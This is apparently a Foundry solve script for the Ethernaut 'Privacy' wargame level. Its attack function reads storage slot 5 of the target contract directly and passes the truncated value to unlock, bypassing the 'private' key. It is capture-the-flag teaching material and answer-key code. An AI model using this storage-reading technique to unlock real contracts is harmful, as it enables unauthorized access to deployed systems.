// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Privacy} from "ethernaut/levels/Privacy.sol";

contract Check is CheckScript("PRIVACY") {}

contract Solve is SolveScript("PRIVACY") {
    Privacy target;

    constructor() {
        target = Privacy(instance);
    }

    function attack() public override {
        bytes16 key = bytes16(vm.load(address(target), bytes32(uint256(5))));
        target.unlock(key);
    }
}
